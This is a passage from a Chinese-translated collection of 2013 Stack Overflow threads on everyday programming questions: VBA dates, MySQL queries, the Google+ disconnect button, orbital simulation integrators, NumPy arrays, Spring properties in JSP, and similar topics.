当 VBA 将 NULL 转换为 String 时，它不再是 NULL...

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-02-27T11:48:55.790

解决方法见评论

```
Public Function forDate(ByVal DateValue As String) As Date ' will only accept string parameter

End Function

' below function is a variant and can accept string , null 
Public Function forDate(DateValue)
    Dim DoDate As Date
    If DateValue & "" <> "" Then 'this will handle null and empty string

        Else
            'will go here when null or empty string
            DateValue = Null
    End If
End Function 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2020-07-05T12:20:37.467

```
Function IsNullDate(ByVal d As Date) As Boolean
    If d = CDate("00:00:00") Then
        IsNullDate = True
    Else
        IsNullDate = False
    End If
End Function

Sub CheckDate()
    Dim d1, d2 As Date
    d1 = Date
    d2 = Empty
    MsgBox "d1= " & IsNullDate(d1) & ",  d2=  " & IsNullDate(d2)
End Sub 
```

运行`CheckDate()`有以下输出：

> d1=假，d2=真

# mysql - mysql查询优化/检索每组中的最后一条记录

> ID：15111219
> 
> 赞同：0
> 
> 时间：2013-02-27T11:42:08.963
> 
> 标签：mysql, query-optimization

有没有办法优化这个mysql查询？我在一个表中有大约 100K 行。

```
select  komentarai.* FROM (
  SELECT MAX(id) AS max_id FROM komentarai WHERE siteid=1 GROUP BY number 
) AS tbl
INNER JOIN `komentarai` ON komentarai.id = tbl.max_id ORDER BY komentarai.added DESC LIMIT XX, 10 
```

下面是索引的解释：

```
PRIMARY <derived2> ALL NULL NULL NULL NULL 3372 Using temporary; Using filesort
PRIMARY komentarai eq_ref PRIMARY,id PRIMARY 4 tbl.max_id 1 2
DERIVED komentarai ref siteid siteid 1 5695 Using where; Using temporary; Using filesort 
```

谢谢！

# button - 在哪里可以获得谷歌品牌的断开按钮？

> ID：15111227
> 
> 赞同：5
> 
> 时间：2013-02-27T11:42:25.397
> 
> 标签：button, google-plus, logout

我将我的网站设置为使用[**google+signin**](https://developers.google.com/+/web/signin/)。

对于登录，谷歌提供了一个或多或少不错的翻译按钮来登录。

编码

```
<span id="signinButton">
  <span
    class="g-signin"
    data-callback="signinCallback"
    data-clientid="CLIENT_ID"
    data-cookiepolicy="single_host_origin"
    data-requestvisibleactions="http://schemas.google.com/AddActivity"
    data-scope="https://www.googleapis.com/auth/plus.login">
  </span>
</span> 
```

扩展为：

![在此处输入图像描述](../Images/fd719832db857ac43783b77ad0139952.png)

要遵守 google 的开发者政策，该应用程序必须提供一种方法来删除您的应用程序与帐户之间的关联。（来自：[谷歌帐户注销和重定向](https://stackoverflow.com/questions/4202161/google-account-logout-and-redirect)）

实现很简单，但据我了解，谷歌没有提供（样式/设计）断开按钮。还是我错过了？它应该看起来像登录按钮。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-27T17:49:16.183

要遵守这些政策，您必须为您的用户提供一种方法来撤销您的应用程序对其信息和帐户的访问权限。这与注销不同。

了解[如何提供断开连接和撤销访问](https://developers.google.com/+/web/signin/#revoking_access_tokens_and_disconnecting_the_app)

用户断开连接后，您将执行条款要求的清理步骤。

这是一个使用文档中的 jQuery 的示例。它假定您将访问令牌存储在全局变量中`access_token`：

```
<script type="text/javascript">
function disconnectUser(access_token) {
  var revokeUrl = 'https://accounts.google.com/o/oauth2/revoke?token=' +
      access_token;

  // Perform an asynchronous GET request.
  $.ajax({
    type: 'GET',
    url: revokeUrl,
    async: false,
    contentType: "application/json",
    dataType: 'jsonp',
    success: function(nullResponse) {
      // Do something now that user is disconnected

      // Start account clean up
    },
    error: function(e) {
      // Handle the error
      // console.log(e);
      // You could point users to manually disconnect if unsuccessful
      // https://plus.google.com/apps
    }
  });
}
// Could trigger the disconnect on a button click
$('#revokeButton').click(disconnectUser);
</script>
<button id="revokeButton">Disconnect</button> 
```

**编辑：**

如果您需要资源来帮助自定义断开连接按钮的外观以匹配登录按钮的外观，您可以使用[Google+ 平台品牌指南](https://developers.google.com/+/branding-guidelines)页面上提供的资源。在该页面上，您可以下载 PhotoShop 源文件，您可以使用这些源文件为您的站点创建断开连接按钮。您需要按照该页面上的说明遵守品牌指南。

站点如何选择提供断开连接选项取决于设计者。一个站点可能更喜欢断开链接，而另一个站点可能更喜欢使用按钮，设计取决于您。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-02T07:42:22.153

仅供参考，即使他们的规则确实规定您必须为用户提供一种撤销访问权限的方法，但这并不强制您让用户轻松地这样做。大多数网站倾向于将断开连接的功能隐藏在某处的用户设置菜单中，将其保留为文本链接。您真的不希望用户如此轻松地断开连接并永远离开。

如果您仍然想拥有该按钮，请在此处查看 CSS 解决方案 [https://developers.google.com/+/web/signin/#customizing_the_sign-in_button](https://developers.google.com/+/web/signin/#customizing_the_sign-in_button)

根据需要进行定制。祝你好运！

# python - 为什么我的天文学模拟不准确？

> ID：15111229
> 
> 赞同：2
> 
> 时间：2013-02-27T11:42:30.833
> 
> 标签：python, floating-point, simulation, astronomy

我制作了一个模拟太阳系中物体运动的程序，但是，我的结果出现了各种不准确之处。

我相信这可能与我的集成方法有关。

* * *

tl;博士在我的模拟和 NASA 的数据之间，地球的位置和速度之间存在细微差别，如果您可以查看下面的代码并告诉我我的数学是否错误。

* * *

我运行的测试是一个为期 10 天（864000 秒）的模拟，`Thu Mar 13 18:30:59 2006`从`Thu Mar 23 18:30:59 2006`.

模拟后，程序报告了地球的以下统计数据：

```
Earth position: (-1.48934630382e+11, -7437423391.22)
Earth velocity: (990.996767368, -29867.6967867) 
```

测量单位当然是米和米每秒。

我使用 HORIZONS 系统来获取`Thu Mar 13 18:30:59 2006`太阳系中大多数大型天体的起始位置和速度矢量，并将它们放入模拟中。

测试后，我再次向HORIZONS查询了`Thu Mar 23 18:30:59 2006`地球数据，得到了以下结果：

```
Earth position: (-1.489348720130393E+11, -7437325664.023257)
Earth velocity: (990.4160633376971, -2986.736541327986) 
```

如您所见，结果的前四位几乎总是相同的。但是，这仍然是一个很大的失误！我很担心，因为我必须模拟几年的时间，而且错误可能会升级。

请您看看我的模拟核心并告诉我我的数学是否不正确？

```
def update (self, dt):
    """Pushes the uni 'dt' seconds forward in time."""

    self.time += dt

    for b1, b2 in combinations(self.bodies.values(), 2):
        fg = self.Fg(b1, b2)

        if b1.position.x > b2.position.x:
            b1.force.x -= fg.x
            b2.force.x += fg.x
        else:
            b1.force.x += fg.x
            b2.force.x -= fg.x

        if b1.position.y > b2.position.y:
            b1.force.y -= fg.y
            b2.force.y += fg.y
        else:
            b1.force.y += fg.y
            b2.force.y -= fg.y

    for b in self.bodies.itervalues():
        ax = b.force.x/b.m
        ay = b.force.y/b.m

        b.position.x += b.velocity.x*dt
        b.position.y += b.velocity.y*dt

        nvx = ax*dt
        nvy = ay*dt

        b.position.x += 0.5*nvx*dt
        b.position.y += 0.5*nvy*dt

        b.velocity.x += nvx
        b.velocity.y += nvy

        b.force.x = 0
        b.force.y = 0 
```

我有这个方法的另一个版本，它应该表现更好，但它表现得更差：

```
def update (self, dt):
    """Pushes the uni 'dt' seconds forward in time."""

    self.time += dt

    for b1, b2 in combinations(self.bodies.values(), 2):
        fg = self.Fg(b1, b2)

        if b1.position.x > b2.position.x:
            b1.force.x -= fg.x
            b2.force.x += fg.x
        else:
            b1.force.x += fg.x
            b2.force.x -= fg.x

        if b1.position.y > b2.position.y:
            b1.force.y -= fg.y
            b2.force.y += fg.y
        else:
            b1.force.y += fg.y
            b2.force.y -= fg.y

    for b in self.bodies.itervalues():
        #Acceleration at (t):
        ax  = b.force.x/b.m
        ay  = b.force.y/b.m
        #Velocity at (t):
        ovx = b.velocity.x
        ovy = b.velocity.y
        #Velocity at (t+dt):
        nvx = ovx + ax*dt
        nvy = ovy + ay*dt
        #Position at (t+dt):
        b.position.x = b.position.x + dt*(ovx+nvx)/2
        b.position.y = b.position.y + dt*(ovy+nvy)/2

        b.force.null() #Reset the forces. 
```

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2013-02-27T11:48:03.887

集成方法*非常*重要。您正在使用欧拉显式方法，该方法的阶精度低，对于适当的物理模拟来说太低了。现在，你有选择

*   一般行为最重要：[Verlet 方法](http://en.wikipedia.org/wiki/Verlet_integration)或[Beeman 方法](http://en.wikipedia.org/wiki/Beeman%27s_algorithm)（Verlet 精度更高），它们具有非常好的能量守恒，但位置和速度的精度较低。
*   精确的位置最重要：[Runge-Kutta](http://en.wikipedia.org/wiki/Runge-kutta)订单 4 或更多。能量不会守恒，所以你的模拟系统会表现得好像能量增加了一样。

此外，时间 = 时间 + dt 将增加大量步骤的精度损失。考虑 time = epoch * dt 其中 epoch 是一个整数，将使时间变量的精度与步数无关。

# python - 使用 ndarray 而不是 python 数组的原因是什么

> ID：15111230
> 
> 赞同：5
> 
> 时间：2013-02-27T11:42:34.310
> 
> 标签：python, numpy, multidimensional-array

我构建了一个对即将到来的数据进行一些迭代的类。数据采用数组形式，不使用 numpy 对象。在我的代码中，我经常`.append`用来创建另一个数组。在某些时候，我将一个 1000x2000 的大数组更改为 numpy.array。现在我有一个又一个错误。我开始将所有数组转换为 ndarray 但类似的评论`.append`不再起作用。我开始遇到指向行、列或单元格的问题。并且必须重建所有代码。

我尝试用谷歌搜索这个问题的答案：“使用 ndarray 比普通数组有什么好处和优势”我找不到一个明智的答案。你能写下我什么时候应该开始使用 ndarrays，如果在你的实践中你是同时使用它们还是只使用一个。

抱歉，如果问题是新手级别，但我是 python 新手，只是尝试从 Matlab 转移并想了解什么是利弊。谢谢

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-02-27T11:44:37.767

NumPy and Python arrays share the property of being efficiently stored in memory.

NumPy arrays can be added together, multiplied by a number, you can calculate, say, the sine of all their values in one function call, etc. As HYRY pointed out, they can also have more than one dimension. You cannot do this with Python arrays.

On the other hand, Python arrays can indeed be appended to. Note that NumPy arrays can however be concatenated together (`hstack()`, `vstack()`,…). That said, NumPy arrays are mostly meant to have a fixed number of elements.

It is common to first build a list (or a Python array) of values iteratively and then convert it to a NumPy array (with `numpy.array()`, or, more efficiently, with `numpy.frombuffer()`, as HYRY mentioned): this allows mathematical operations on arrays (or matrices) to be performed very conveniently (simple syntax for complex operations). Alternatively, `numpy.fromiter()` might be used to construct the array from an iterator. Or `loadtxt()` to construct it from a text file.

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2013-02-27T11:50:53.850

使用 NumPy 数组至少有两个主要原因：

*   NumPy 数组比 Python 列表需要更少的空间。因此，您可以在 NumPy 数组（内存中）中处理比 Python 列表更多的数据。
*   NumPy 数组有大量 Python 列表或 Python 数组无法使用的函数和方法库。

是的，您不能简单地将列表转换为 NumPy 数组并期望您的代码继续工作。方法不同，布尔语义不同。为了获得最佳性能，甚至可能需要更改算法。

但是，如果您正在寻找 Matlab 的 Python 替代品，您肯定会找到 NumPy 的用途。值得学习。

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2013-02-27T12:11:42.817

`array.array`可以动态改变大小。如果您从某个来源收集数据，最好使用`array.array`. 但`array.array`只是一维，并没有与之相关的计算函数。因此，当您想对数据进行一些计算时，请将其转换为`numpy.ndarray`，并使用 numpy.

`numpy.frombuffer`可以创建一个与对象`numpy.ndarray`共享相同数据缓冲区的`array.array`对象，速度很快，因为它不需要复制数据。

这是一个演示：

```
import numpy as np
import array
import random

a = array.array("d")
# a for loop that collects 10 channels data
for x in range(100):
    a.extend([random.random() for _ in xrange(10)])

# create a ndarray that share the same data buffer with array a, and reshape it to 2D
na = np.frombuffer(a, dtype=float).reshape(-1, 10)

# call some numpy function to do the calculation
np.sum(na, axis=0) 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2018-10-30T22:04:02.573

与内置列表相比，使用 NumPy 数组的另一个巨大优势是 NumPy 有一个 C API，允许本机 C 和 C++ 代码直接访问 NumPy 数组。因此，许多用 C 等低级语言编写的 Python 库都希望您使用 NumPy 数组而不是 Python 列表。

**参考：**用于数据分析的 Python：使用 Pandas、NumPy 和 IPython 进行数据处理

# java - 错误代码的 RestFul webservices 响应

> ID：15111231
> 
> 赞同：1
> 
> 时间：2013-02-27T11:42:36.137
> 
> 标签：java, web-services, rest

我正在开发提供 JSON 响应的 Restful Web 服务，当输入的 id=11 没有数据时，我得到以下输出

GET 请求失败 请求失败 --> 状态：(204) 响应：{

}

现在我希望该响应字段包含错误代码 = 204 的正确消息，例如“无效请求”或“ID 不存在”

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-27T11:45:14.453

If you are using Jersey or similar JAX-RS framework you can modify your code similar to :

```
return Response.status(204).type("text/plain")
                .entity("Invalid Request!").build(); 
```

# selenium - 如何将手动打开的浏览器设置为 Selenium webDriver

> ID：15111233
> 
> 赞同：2
> 
> 时间：2013-02-27T11:42:40.030
> 
> 标签：selenium

我正在致力于自动化 Web 应用程序。

我有很多页面，例如登录页面等，并且有很多标签。每个选项卡会打开不同的页面，例如，如果我要打开 page3，我必须先通过 page1，然后再通过 page2。

这里我的问题是如果我想在 page3 上测试一些功能，那么我必须浏览所有页面。测试单个功能需要花费大量时间，我需要花费大量时间。

有什么方法可以将已经打开的浏览器设置为 Selenium WebDriver？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-27T11:52:28.373

抱歉不行。

这是目前 Selenium 上星号最多的功能请求（2013 年 2 月，当前的 Selenium 2.30.0）。它也是最古老的之一。

[http://code.google.com/p/selenium/issues/detail?id=18](http://code.google.com/p/selenium/issues/detail?id=18)

Firefox 已经为此做了一些工作，但它没有文档记录，*非常*实验性，并且很长一段时间都没有看到任何变化。有关更多信息，请查看链接的功能请求。

前端自动化很难，Selenium 只能做普通用户能做的事情。您能做的最好的事情是在许多远程机器上并行运行测试。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-11-06T09:22:15.047

No... It is not possible....

In order to reduce the manual execution, we are moving towards automation.

Inbetween you cannot automate.

# http - WebSocket 和 http 协议的主要区别是什么？

> ID：15111234
> 
> 赞同：2
> 
> 时间：2013-02-27T11:42:42.073
> 
> 标签：http, websocket

WebSocket 和 http 协议之间的主要区别是什么？WebSocket 协议与 http 有何不同？

谢谢斯内哈
_

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-27T12:02:11.307

WebSockets 与 http 完全不同。它仅使用类似 http 的通信进行初始握手。

# umbraco - 无法卸载我创建的 Umbraco 包，而不先删除父文档类型

> ID：15111235
> 
> 赞同：2
> 
> 时间：2013-02-27T11:42:49.733
> 
> 标签：umbraco

我希望有人能解释为什么会这样。我刚刚开始在 Umbraco 中创建自己的包，并且遇到了一些应该很直接的问题。

我创建了一个相当简单的包，包括内容页面和子页面、文档类型、模板、一些 CSS 和一些脚本。我在另一个 Umbraco 网站上安装了该软件包，一切似乎都很好。问题是当我卸载包时，它试图删除它不能做的父文档类型，也不应该这样做，因为这些不在我创建的原始包中。

我在这里想念什么人？

提前致谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T07:43:28.850

包管理器将尝试打包所有必需的依赖项。

当你创建你的包时，你是否选择了嵌套在父文档类型下的文档类型？如果是这样，这可能就是为什么作为父文档类型然后成为依赖项并且很可能实际上包含在您的包中。从卸载页面应该很容易看到它试图删除的内容，如果列出了该文档类型，它就在您的包中。

# c# - 具有xml指定数据结构的二进制解码器

> ID：15111240
> 
> 赞同：0
> 
> 时间：2013-02-27T11:43:01.037
> 
> 标签：c#, xml, binaryfiles

我想构建 C# 二进制解码器。我有描述二进制文件数据结构的 XML 文件。

下一步是基于该 XML 动态创建数据结构（在代码中）。你们对我有任何意见、链接、代码等吗？

我知道这是一个普遍的问题，但我只想从哪里开始，我不知道从哪里开始。

编辑：

抱歉需要删除代码...

BR

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-27T12:11:29.137

由于您想动态创建结构（而不​​是基于 XML 定义静态构建类），我猜您需要一个通用数据结构，然后您可以查询。这到底是什么样子取决于您描述的数据结构类型。是记录和字段吗？层次结构中是否有多种记录类型？如果没有层次结构，您可以只为每个字段使用键值对字典。如果存在层次结构，我会认为可导航树将涵盖大多数情况。您可以为此使用 XML DOM，但我认为这不是最干净的解决方案，我更喜欢使用通用树结构。没有内置的（请参阅[C# 中的树数据结构](https://stackoverflow.com/questions/66893/tree-data-structure-in-c-sharp)），但使用泛型创建一个相当容易。

编辑

以上假设您要动态创建要动态使用的*结构*。如果您想在代码中动态地创建一个将被静态使用的结构*（*例如，您希望能够编写类似`myDataStrucureThatWasDefinedInXml.MyProperty1`的东西），请查看 CodeDom。

并且考虑了更多，这实际上取决于您在反序列化二进制数据后想要做什么。您可能还想查看 Expando 对象和表达式树。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-27T11:49:07.320

要读取和写入 XML 文档的内容，您可以使用`XmlDocument`C# 中提供的类。

以下是一些可以帮助您的链接：

*   [http://www.codeproject.com/Articles/318876/Using-the-XmlReader-class-with-Csharp](http://www.codeproject.com/Articles/318876/Using-the-XmlReader-class-with-Csharp)
*   [http://www.codeproject.com/Articles/21167/XML-C-STARTING-GUIDE-First-Part](http://www.codeproject.com/Articles/21167/XML-C-STARTING-GUIDE-First-Part)

# html - 滚动在 div 的 iframe 中不起作用

> ID：15111245
> 
> 赞同：0
> 
> 时间：2013-02-27T11:43:08.213
> 
> 标签：html, iframe, scroll, scrollbar

我不太擅长编码，这次我什至无法从互联网上找到答案。
我制作了一个 iframe 并将其放在一个 div 中。我想滚动 iframe 中的内容，但由于某种原因，我无法滚动到页面末尾。

我不太擅长解释，所以我希望这些图片能清楚我的意思：
我有什么：http: [//i87.photobucket.com/albums/k123/gaikotsu_/scroll.png](http://i87.photobucket.com/albums/k123/gaikotsu_/scroll.png)
我想要什么：[http:// /i87.photobucket.com/albums/k123/gaikotsu_/scroll2.png](http://i87.photobucket.com/albums/k123/gaikotsu_/scroll2.png)

如您所见，iframe 在底部被切割，因此缺少 3 行艺术。我已经尝试了我能想到的一切，这让我很沮丧！

这是 div 的 css：

```
 #main {
    background-color: transparent;
}

.frame {
    display: block;
    border: medium none;
    position: absolute
    height: 100%;
    width: 100%;
    overflow: hidden;
} 
```

以下是我创建 div/iframe 的方式：

```
<div id="main" style="overflow-y: auto; height: 100%; overflow-x: hidden; position: absolute; left: 294; top: 44; border: ">
<iframe name="main" src="main.htm" height="710px" width="610px" scrolling="no" border="0" frameborder="0" allowtransparency="true" class="frame">
    </iframe>
</div> 
```

我很感激任何帮助！谢谢阅读！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2014-09-03T18:42:22.193

`position: absolute`您在 .frame CSS之后缺少一个分号。

它使下一行`height:100%`, 未解决。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-19T08:48:31.103

我也面临同样的问题。我设置

```
iframe{
    height: 100%; 
   } 
```

它对我有用。

# c# - 如何将屏幕鼠标坐标转换为 POINTS 结构

> ID：15111247
> 
> 赞同：0
> 
> 时间：2013-02-27T11:43:18.450
> 
> 标签：c#, wpf, winapi

我必须为自定义绘制的 WPF 窗口发送一些手动窗口消息。具体来说，当用户在标题栏中左键时，我必须手动发送[WM_NCLBUTTONDOWN](http://msdn.microsoft.com/en-gb/library/windows/desktop/ms645620%28v=vs.85%29.aspx)消息。

到目前为止，我有：

```
[DllImport("user32.dll")]
public static extern int SendMessage(IntPtr hWnd, int Msg, int wParam, int lParam); 
```

有趣的部分是将值放入 lParam。它需要是一个表示鼠标 X 和 Y 坐标的 Int32 (DWORD)。

定义了一个[宏](http://msdn.microsoft.com/en-gb/library/windows/desktop/dd145043%28v=vs.85%29.aspx)来创建必要的结构，但它对我没有帮助。所以，问题是这样的：

在 WPF 窗口中，如何使用作为 lParam 参数传入的正确值正确触发此消息？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-27T12:20:22.867

```
lParam = x | (y << 16); 
```

其中 x 和 y 是坐标。

要从消息中提取值：

```
int x = lParam & 0xFFFF;
int y = (lParam >> 16) & 0xFFFF; 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-02-27T17:05:30.937

另一个答案将因鼠标坐标为负而失败，当您有多个显示器时可能会看到。我认为这会起作用：

```
int lParam = (ushort)x | (y << 16);

x = (short)lParam;
y = (short)(lParam >> 16); 
```

# python - 如何记录 Python 崩溃？

> ID：15111249
> 
> 赞同：11
> 
> 时间：2013-02-27T11:43:23.290
> 
> 标签：python

我在树莓派中运行 python 代码。该代码应该永远存在。但是，几个小时后它崩溃了。由于它在远程机器上运行，我看不到它在崩溃期间给出的消息。

如何将此消息存储在文件中，以便查看问题所在？这是在linux中自主完成的吗？或者我应该编写一些函数来在崩溃期间导出错误。我怎样才能做到这一点？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-02-27T11:48:29.067

如果进程是这样​​启动的，您可以将输出存储在文件中：

```
python script.py >> /logdir/script.py.log 2>&1 
```

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2015-10-22T16:00:12.120

如果主函数崩溃，您可以拥有一个主函数并登录

```
def main():
   ...
   raise ValueError("Crashed because I'm a bad exception")
   ...

if __name__ == "__main__":
   try:
      main()
   except Exception as e:
      logger.exception("main crashed. Error: %s", e) 
```

如果您正在使用类似 logstash 的东西并希望在您的 UI 上查看错误和时间，这会更好。

感谢[Eric](https://stackoverflow.com/users/102441/eric)改进了答案

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2020-12-03T16:14:58.500

我自己尝试了很多次，但它们看起来都很奇怪......直到我想通了！只需在您的 python 文件周围编写此代码，一切都会好起来的！顺便说一句，我将命名崩溃日志 CRASH- 然后是 python 时间（例如 CRASH-1607012036.015824.txt）

```
try:
    <your program here>
except Exception as e:
    crash=["Error on line {}".format(sys.exc_info()[-1].tb_lineno),"\n",e]
    print(crash)
    timeX=str(time.time())
    with open("monstergame/crashlogs/CRASH-"+timeX+".txt","w") as crashLog:
        for i in crash:
            i=str(i)
            crashLog.write(i) 
```

注意：这是 Python 3 代码，而不是 Python 2

# php - cakePHP 示例中的插件

> ID：15111251
> 
> 赞同：3
> 
> 时间：2013-02-27T11:43:27.003
> 
> 标签：php, cakephp, cakephp-2.3

我正在学习蛋糕 PHP，您能否提供任何插件示例的链接。我需要一个简单的插件教程或运行示例。提前致谢 。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-27T13:00:22.850

要创建插件，最好的解决方案是[cakephp](http://book.cakephp.org/2.0/en/plugins.html)书，但如果您渴望自己编写并找到类似的其他教程[插件开发技巧和窍门](http://bakery.cakephp.org/articles/sky_l3ppard/2010/01/31/plugin-development-tips-and-tricks) 可能会对您有所帮助，但对于运行示例，最好的解决方案是[调试工具包](https://github.com/cakephp/debug_kit)，推荐蛋糕PHP。

# asp.net - 文本框用户输入限制

> ID：15111256
> 
> 赞同：0
> 
> 时间：2013-02-27T11:43:35.050
> 
> 标签：asp.net, html

我使用`onkeypress="return this.value.length"`它工作正常。但我确实复制并粘贴它继续将数据放入文本框中。它也应该适用于复制粘贴操作。

我也需要为复制粘贴操作做些什么！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-27T11:49:37.920

键入时使用以下代码查找长度

```
<input type="text" onkeyup="alert(this.value.length)" / > 
```

希望能帮助到你 ！！:)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-27T12:24:29.987

如果您正在寻找一种方法来限制可以在文本框中输入的字符，您可能会发现 AjaxControlToolKit 可以提供帮助。它有一个名为 Filtered Textbox contro 的控件。看看[http://www.asp.net/ajaxLibrary/AjaxControlToolkitSampleSite/FilteredTextBox/FilteredTextBox.aspx](http://www.asp.net/ajaxLibrary/AjaxControlToolkitSampleSite/FilteredTextBox/FilteredTextBox.aspx)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-27T11:46:05.723

`onchange`与`onkeypress`. _ 这样你放在那里的任何东西也会在变化时执行

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-02-27T11:51:42.943

我认为`ontextchanged=""`可以覆盖它

# sql - SQL like statement, issue with singular, plural keyword

> ID：15111257
> 
> 赞同：0
> 
> 时间：2013-02-27T11:43:43.503
> 
> 标签：sql, sqlite

```
 for (String column : searchCols) {
            for (String keyword : keywords) { 
                listAllSql.append(getDBColumnName(column));
                listAllSql.append(" like "); //like
                listAllSql.append("'%");     //'%vision%'
                listAllSql.append(keyword); 
                listAllSql.append("%'"); 
                listAllSql.append(" or ");
            } 
```

Here is a snippet of of the code. I pass a keyword for example "Networks" to be searched for. I want the statement to return me result event if it finds "Network" (Singular) as well as those which contains "Networks" (plural). What changes to do I make to the above statement to achieve this. I am actually working with 'SQLite' Manager as an add on on Mozilla Firefox FYI.

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-27T12:02:56.560

您可以添加到顶部（不确定语言）：

```
for (String keyword : keywords) { 
    if right(keyword,1) = "s" and length(keyword) > 1 then
        keyword = left(keyword,length(keyword)-1)
    end if
    listAllSql.append..... 
```

您可能会遇到问题，他们搜索“as”并返回所有包含“a”的单词，但查找复数单词而不只是以 s 结尾的单词会困难得多，通常搜索中的误报也比误报要好（在我看来）。

# java - 如何在 Spring MVC 应用程序中的 JSP 中显示属性文件中的值

> ID：15111260
> 
> 赞同：21
> 
> 时间：2013-02-27T11:43:52.963
> 
> 标签：java, spring, jsp, spring-mvc

我正在`app-servlet.xml`使用这样的 bean 设置我的属性：

```
 <bean class="org.springframework.beans.factory.config.PropertyPlaceholderConfigurer">
            <property name="location" value="/WEB-INF/my.properties"></property>
    </bean> 
```

大多数时候，我访问控制器或其他类中的属性，如下所示：

```
@Value("${dbtype}")
public String dbType; 
```

但是如果我想使用 JSP 文件中的属性并绕过控制器怎么办。这意味着我不希望将值类型作为模型属性从控制器传递到 JSP。

有没有办法直接在jsp中访问属性？

* * *

## 回答 #1

> 赞同：36
> 
> 时间：2013-02-27T12:02:07.690

**弹簧配置**

```
<util:properties id="propertyConfigurer" 
                  location="classpath:yourPropertyFileClasspathHere "/>
<context:property-placeholder properties-ref="propertyConfigurer" /> 
```

**jsp**

```
<spring:eval expression="@propertyConfigurer.getProperty('propertyNameHere')" /> 
```

* * *

## 回答 #2

> 赞同：23
> 
> 时间：2015-01-20T14:46:25.767

您还可以执行的操作不会将您与在单个属性占位符中查找属性联系起来，或者如果您使用 java config 并且仅实例化 PropertySourcesPlaceholderConfigurer 是使用环境对象：

```
<spring:eval expression="@environment.getProperty('application_builtBy')" /> 
```

* * *

## 回答 #3

> 赞同：10
> 
> 时间：2015-04-09T20:42:57.397

```
<bean class="org.springframework.context.support.ReloadableResourceBundleMessageSource" 
    id="messageSource"
    p:basenames="WEB-INF/i18n/site"
    p:fallbackToSystemLocale="false"/> 
```

现在这是你的**属性文件**

```
site.name=Cool Bananas 
```

这是你的**JSP**

```
<%@ taglib uri="http://www.springframework.org/tags" prefix="spring" %>
<html>
  <head>
    <title><spring:message code="site.name"/></title>
  </head>
  <body>
  </body>
</html> 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-09-12T01:22:54.807

在上下文中，只需这样做：

```
<util:properties 
    id="propertyConfigurer"
    location="classpath:yourPropertyFileClasspathHere"
/>
<context:property-placeholder properties-ref="propertyConfigurer" /> 
```

[用于创建 Properties bean（与他的答案](https://stackoverflow.com/a/15111620/449553)中的 @nkjava.blogspot.com 相同）。但这并不是所有需要做的工作。

现在您需要将此 bean 公开给 JSP。有几种方法可以做到这一点，取决于视图解析器的类型。[InternalResourceViewResolver](https://stackoverflow.com/a/1296548/449553)有解决方案- 您需要将“exposeContextBeansAsAttributes”设置为 true 并使用所需 bean 列表填充“exposedContextBeanNames”。

对于[瓷砖](https://stackoverflow.com/questions/2848415/accessing-spring-beans-from-a-tiles-view-jsp)也是解决方案。

比你可以简单地在你的 JSP 中使用这个 bean。例如通过 EL：

```
${propertyConfigurer['my.string.from.prop.file']} 
```

* * *

## 回答 #5

> 赞同：-2
> 
> 时间：2019-02-21T01:10:17.317

## 在 Spring 版本 4 中，您可以找到属性文件：

## 1）xml模式

```
 <bean class="org.springframework.context.support.PropertySourcesPlaceholderConfigurer">
                   <property name="ignoreUnresolvablePlaceholders" value="true"/>
                      <property name="locations">
                          <list>
                            <!-- default resources folder (default package maven project) -->
                             <value>classpath:mongodb.remote.properties</value>  
                                <!-- Or in /WEB-INF/ folder -->
                              <value>/WEB-INF/mongodb.remote.properties</value>  
                          </list>
                      </property>
                  </bean>
---------------------------------------------------------------------------------------- 
```

## 2）程序化模式：

```
 If you have for example this package : com.profile.config, com.profile.controller, ecc.. 
    it's not problem if you put only com.profile, it's ok !!! Now

    @Configuration
    @ComponentScan(basePackages = "com.profile")
    /** resources folder & default package maven project*/
    @PropertySource(value = { "classpath:mongodb.remote.properties" }) 
    public class MyPropertySourcesPlaceholderConfigurer {

        @Bean
        public static PropertySourcesPlaceholderConfigurer propertySourcesPlaceholderConfigurer() {
            return new PropertySourcesPlaceholderConfigurer();
        }
    }

    ---------------------------------------------------------------------------------
    Your property file

    label.test.val=this is the property file value!!!!!
    ---------------------------------------------------------------------------------

    @Controller
    public class LabelsAndValuesController {

         @Value("${label.test.val}")
         String test;

    } 
```

## 输出：

```
 ---------------------------------------------------------------------------------
    this is the property file value!!!!!
    --------------------------------------------------------------------------------- 
```

# javascript - 将字符串从一个函数传递到下一个 javascript

> ID：15111264
> 
> 赞同：0
> 
> 时间：2013-02-27T11:44:06.650
> 
> 标签：javascript, jquery, xml, api, function

我有一个简单的 JavaScript 客户端，它从 REST API 中提取一些书籍数据，但是我似乎无法调用函数 createBookRow(bookid) 并将适当的 html 字符串返回到调用它的文档就绪函数，

输出当前正在正确生成，已通过 html 页面上的 .row-fluid 附加验证，欢迎提出想法或建议

```
function createBookRow(bookid)
{
$.get('http://mysite.co.uk/atiwd/books/course/'+bookid+'/xml', function(xml){  

